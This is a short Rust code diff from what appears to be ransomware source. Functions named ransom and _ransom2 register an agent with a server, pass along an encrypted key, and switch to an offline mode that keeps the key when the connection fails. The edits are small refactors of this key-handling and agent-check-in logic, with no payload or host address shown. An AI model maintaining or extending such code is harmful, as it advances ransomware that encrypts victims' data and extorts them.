@@ -50,7 +50,7 @@ pub async fn _ransom2(logger: Arc<logger::Logger>, config: &AppConfig) -> Result
         config.retries, 
         config.timeout_seconds,
         &logger,
-        Vec::new()).await;
+        &Vec::new()).await;
 
     
     let offline = agent_id == 0;
@@ -148,11 +148,11 @@ pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(
         config.retries, 
         config.timeout_seconds,
         &logger,
-        encrypted_key).await;
+        &encrypted_key).await;
 
     // If unable to connect, enter offline mode until able to reestablish connection
     if agent_id == 0 {
-        agent_state.offline_mode(config).await;
+        agent_state.offline_mode_key(config, encrypted_key).await;
     } else {
         agent_state.agent_id = agent_id;
         agent_state.session_id = session_id;
